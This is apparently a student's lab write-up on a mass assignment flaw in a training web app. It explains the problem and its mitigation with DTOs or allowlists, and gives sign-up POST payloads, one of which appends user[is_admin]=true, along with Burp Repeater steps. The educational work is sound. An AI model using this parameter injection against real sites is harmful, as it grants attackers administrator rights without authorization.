# Mass assignment

## Answers
1. Explain the security problem
    - The parameters being sent in the post request end in the database due to some auto binding server side. Probably, the server side (framework) code will take all properties passed in the UI and assign them to an object that is used to save the data to the database. The object that is saved (or whose properties) are saved is directly bound to the incomming http parameters, apparently without any additional checks
2. Explain the exploit
    - by adding user[is_admin]=true to the payload, the property is_admin is automatically set to the server side user object. From the other payload, i can guess the syntax, however the property name I have to guess/try out (or read the lab description :-) 
3. Explain mitigation (how this can be fixed)
    - Automatically bind data coming from the http request to an object that saved to the database is not a good idea. Instead DTO objects should be used that contain only the properties that are allowed for this particular use case. Such a dto can be used for automated binding. There is a bit more to code as the values from the dto object have to be mapped to another object that is used to save the data (usually)
    - if dto is not possible for whatever reason, the allowed properties should be whitelisted (or less ideal, we blacklist the potentialy abused properties)


## Steps

**create "normal" user**
Post-Request for sign up/creating a user  `/users`

Payload: `utf8=%E2%9C%93&authenticity_token=UZ5zGI6i24uuPn7UPOmUFi%2BpyieJpYUIlmVMxRnFe%2Fw%3D&user%5Bemail%5D=daniel.knoepfel%40ost.ch&user%5Bpassword%5D=abc123&user%5Bpassword_confirmation%5D=abc123&commit=Sign+up`

**create admin user user**
Payload: `utf8=%E2%9C%93&authenticity_token=GUZoIwAI9XLdb%2FiWFBOYJQZ30KnzeHv8bG2jFzED0j8%3D&user%5Bemail%5D=admin.knopf%40ost.ch&user%5Bpassword%5D=abc123&user%5Bpassword_confirmation%5D=abc123&commit=Sign+up&user%5Bis_admin%5D=true`

Steps in Burp
1. Set up Burp 
2. Start intercepting while surfing on  http://rma.vm.vuln.land/
    - Post request '/users' is intercepted
3. in Burp>Prox > right click and send to repeater
4. in Repeater adjust the raw request and add "Bis_admin%5D=true" to the payload
5. Send request -> admin user is created

**create future message**
basically the same as for creating an admin user but for a different request.